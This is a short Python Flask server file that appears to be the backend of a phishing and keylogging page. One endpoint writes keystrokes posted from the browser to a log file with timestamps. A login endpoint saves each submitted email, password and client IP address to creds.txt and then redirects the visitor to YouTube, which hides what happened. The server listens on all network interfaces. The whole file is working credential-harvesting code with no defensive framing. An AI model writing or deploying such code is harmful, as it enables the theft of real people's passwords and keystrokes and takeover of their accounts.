from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)
log_file = "web_keylog.txt"
creds_file = "creds.txt"

open(log_file, "w").close()
open(creds_file, "w").close()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def log_key():
    data = request.get_json()
    key = data.get("key")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] {key}\n")
    return "", 204

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    with open("creds.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password}\n")

    # redirect
    return redirect("https://www.youtube.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
    